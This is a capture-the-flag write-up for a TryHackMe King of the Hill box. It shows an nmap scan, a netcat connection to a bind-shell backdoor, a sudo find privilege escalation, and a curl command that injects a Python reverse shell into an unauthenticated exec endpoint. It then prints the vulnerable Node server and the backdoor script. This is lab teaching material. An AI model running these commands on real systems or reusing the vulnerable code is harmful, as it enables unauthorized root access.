---
title: TryHackMe KoTH - Spacejam
author: trevohack
date: 2023-08-20 11:33:00 +0800 
categories: [TryHackMe]
tags: [hacking, koth]
pin: true
math: true
mermaid: true
---

![](https://i.postimg.cc/xTVmDV6L/tryhackme-logo-icon-249349.png)

## Initial NMAP Scan
```bash
sudo nmap -p- --min-rate 10000 -Pn -vv --open $VMIP 

Initiating Connect Scan at 04:16  
Scanning 10.10.9.93 [65535 ports]  
Discovered open port 80/tcp on 10.10.9.93  
Discovered open port 22/tcp on 10.10.9.93  
Discovered open port 23/tcp on 10.10.9.93  
Discovered open port 3000/tcp on 10.10.9.93 
Discovered open port 61432/tcp on 10.10.9.93 
``` 

## Method 1

* Random high port in this case `61432`, gives a connection as user `jordan`.

```bash
nc $IP <random_high_port>
nc $IP 61432 
``` 

```bash
❯ nc 10.10.9.93 61432  
whoami  
jordan
``` 

> Privilege Escalation

```bash
> sudo -l -l  
Matching Defaults entries for jordan on spacejam:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User jordan may run the following commands on spacejam:  
  
Sudoers entry:  
   RunAsUsers: ALL  
   Options: !authenticate  
   Commands:  
       /usr/bin/find 
``` 

* Jordan can execute `/usr/bin/find` with `sudo` privileges
* Simple Privilege Escalation: `sudo find . -exec /bin/sh \; -quit`

## Method 2 

> Direct root with one linear 

```bash

# On initial port 3000 runs a RCE as root user! 
LHOST="YOURIP"
LPORT=Listening_PORT
RHOST="VICTIM_IP"

❯ curl "http://$RHOST:3000/?cmd=python%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.136.133%22,4242));os.dup2(s.fileno(),0);os.  
dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27" 
``` 

### Your Root!

## Patching

```js
/home/bunny/simple-command-injection/server.js

const express = require('express')  
const app = express()  
const { exec } = require('child_process');  
  
app.get('/', (req, res) => {  
   var param = req.query.cmd  
   if(!param){  
       res.send("the cmd parameter is undefined")  
   }  
   exec(param, (err, stdout, stderr) => {  
       if(err){  
           console.log("there was an error running your command")  
           console.log(err)  
           res.send("there was an error running your command" + err)  
       }  
       else{  
           res.send(stdout + '\n' + stderr)  
       }  
   })  
})  
  
app.listen(3000, () => console.log('App listening on port 3000!')); // Manupilate this! 
``` 

> Change this as well /home/jordan/easyaccess.py

```python
#!/usr/bin/env python3  
  
import socket  
import os  
  
HOST = '0.0.0.0'    
PORT = 61432       
  
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  
   s.bind((HOST, PORT))  
   s.listen()  
   conn, addr = s.accept()  
   with conn:  
       print('Connected by', addr)  
       while True:  
           data = conn.recv(1024).decode("utf-8")  
           output = os.popen(str(data)).read()  
           cmd = str.encode(output)  
           if not data:  
               break  
           conn.sendall(cmd)
``` 

## That's It🤘
